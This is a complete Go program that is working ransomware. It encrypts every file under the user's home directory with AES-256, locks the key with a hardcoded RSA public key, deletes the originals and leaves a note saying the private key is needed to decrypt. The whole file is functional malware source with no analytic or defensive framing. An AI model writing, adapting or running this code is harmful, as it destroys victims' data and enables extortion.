package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Hardcoded RSA public key (PEM format)
const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArDl7aANEYQeee7yLHDtp
ApxWScE6bra8+n9SAjCiRq6Knaa9rVNR5wRer+VBrD6EeFgfnRsEoaPadEqOcwf4
3D1XNfWEL7o21R+CapkUVCRP7v6W5NH0oBu0nrTBrS8CZKGzS8jrbLWR3mO4qzx9
DaW2xUMVo4RiO0HnRqtvfegdbf565XvuATHhcrReHncHjuOYsTvb6bYwW2qCNSUK
ciKk/dd85at7EjjizDvIRxTWMt38sAorjUwnpm+zU6vO6y8hFsePppu1/yjVqFD7
Su3f+p65QODo96EGv2iykcj58hzmB+cs40Sz4zXEMWy25j8SFZHS+rJAa+9WS+LC
vQIDAQAB
-----END PUBLIC KEY-----`

// List to store encrypted file paths
var encryptedFiles []string

func main() {
	// Determine home directory based on the operating system
	homeDir, err := getHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
		return
	}

	// List of directories to exclude (system directories)
	excludeDirs := getSystemExclusionDirs()

	// Load the RSA public key from the hardcoded PEM string
	publicKey, err := parsePublicKey(publicKeyPEM)
	if err != nil {
		fmt.Println("Error parsing public key:", err)
		return
	}

	// Generate a random AES key
	aesKey := make([]byte, 32) // AES-256 uses a 256-bit key (32 bytes)
	if _, err := rand.Read(aesKey); err != nil {
		fmt.Println("Error generating AES key:", err)
		return
	}

	// Encrypt the AES key using the RSA public key
	encryptedAESKey, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, aesKey)
	if err != nil {
		fmt.Println("Error encrypting AES key:", err)
		return
	}

	// Save the encrypted AES key as Base64
	encodedAESKey := base64.StdEncoding.EncodeToString(encryptedAESKey)
	err = ioutil.WriteFile("encrypted_aes_key.b64", []byte(encodedAESKey), 0644)
	if err != nil {
		fmt.Println("Error saving encrypted AES key:", err)
		return
	}

    err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            fmt.Printf("Error accessing file %s: %v\n", path, err)
            return nil // Continue to the next file
        }
    
        // Skip directories
        if info.IsDir() {
            for _, excludeDir := range excludeDirs {
                if strings.HasPrefix(path, excludeDir) {
                    fmt.Println("Skipping system directory:", path)
                    return filepath.SkipDir
                }
            }
            return nil
        }
    
        // Skip specific files from being encrypted
        if info.Name() == "encrypted_aes_key.b64" || info.Name() == "note.txt" || strings.Contains(info.Name(), "decryptor") {
            fmt.Printf("Skipping file: %s\n", path)
            return nil
        }
    
        fmt.Println("Encrypting file:", path)
    
        // Read the file content
        fileContent, err := ioutil.ReadFile(path)
        if err != nil {
            fmt.Printf("Failed to read file %s: %v\n", path, err)
            return nil // Continue to the next file
        }
    
        // Encrypt the content using AES-256-CBC
        encryptedContent, err := encryptAES256CBC(aesKey, fileContent)
        if err != nil {
            fmt.Printf("Failed to encrypt file %s: %v\n", path, err)
            return nil // Continue to the next file
        }
    
        // Encode the encrypted content to Base64
        encodedContent := base64.StdEncoding.EncodeToString(encryptedContent)
    
        // Write the Base64 encoded encrypted content to a new file with the ".enc" extension
        encryptedFilePath := path + ".enc"
        err = ioutil.WriteFile(encryptedFilePath, []byte(encodedContent), 0644)
        if err != nil {
            fmt.Printf("Failed to write encrypted file %s: %v\n", encryptedFilePath, err)
            return nil // Continue to the next file
        }
    
        // Append the encrypted file path to the list
        encryptedFiles = append(encryptedFiles, encryptedFilePath)
    
        // Remove the original file after successful encryption
        err = os.Remove(path)
        if err != nil {
            fmt.Printf("Failed to delete original file %s: %v\n", path, err)
            return nil // Continue to the next file
        }
    
        fmt.Println("File encrypted and saved to:", encryptedFilePath)
        fmt.Println("Original file deleted:", path)
        return nil
    })
    

	if err != nil {
		fmt.Println("Error encrypting files:", err)
	}

	// Create note.txt after processing all files
	err = createNoteFile()
	if err != nil {
		fmt.Println("Error creating note.txt:", err)
	} else {
		fmt.Println("note.txt created successfully.")
	}
}

// encryptAES256CBC encrypts data using AES-256-CBC
func encryptAES256CBC(key, plaintext []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("key length must be 32 bytes for AES-256")
	}

	// Generate a random IV (initialization vector)
	iv := make([]byte, aes.BlockSize) // AES block size is 16 bytes
	if _, err := rand.Read(iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	// Create a new AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	// Pad the plaintext to be a multiple of the block size
	paddedPlaintext := pad(plaintext, aes.BlockSize)

	// Create a ciphertext buffer
	ciphertext := make([]byte, len(paddedPlaintext))

	// Create a new CBC mode encrypter
	mode := cipher.NewCBCEncrypter(block, iv)

	// Encrypt the plaintext
	mode.CryptBlocks(ciphertext, paddedPlaintext)

	// Prepend the IV to the ciphertext (IV is not secret)
	return append(iv, ciphertext...), nil
}

// pad pads the plaintext to a multiple of the block size using PKCS#7
func pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

// createNoteFile creates a note.txt with details about the encryption process
func createNoteFile() error {
	noteContent := "Encryption Process Complete\n"
	noteContent += "Date: " + time.Now().Format(time.RFC1123) + "\n"
	noteContent += "Encrypted Files:\n"

	for _, filePath := range encryptedFiles {
		noteContent += filePath + "\n"
	}

	noteContent += "\nYour files have been encrypted. For decryption, you need the private key."

	// Save the note to note.txt
	return ioutil.WriteFile("note.txt", []byte(noteContent), 0644)
}

// parsePublicKey parses a PEM encoded RSA public key from a string
func parsePublicKey(pemString string) (*rsa.PublicKey, error) {
	// Decode the PEM block
	block, _ := pem.Decode([]byte(pemString))
	if block == nil || block.Type != "PUBLIC KEY" {
		return nil, fmt.Errorf("failed to decode PEM block containing public key")
	}

	// Parse the public key
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse public key: %w", err)
	}

	// Type assertion to *rsa.PublicKey
	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA public key")
	}

	return rsaPubKey, nil
}

// getHomeDir returns the home directory based on the operating system
func getHomeDir() (string, error) {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERPROFILE"), nil
	}
	return os.Getenv("HOME"), nil
}

// getSystemExclusionDirs returns a list of system directories to exclude from encryption
func getSystemExclusionDirs() []string {
	if runtime.GOOS == "windows" {
		return []string{
			`C:\Program Files`,
			`C:\Program Files (x86)`,
			`C:\Windows`,
		}
	}
	return []string{
		`/System`,
		`/Library`,
		`/Applications`,
	}
}
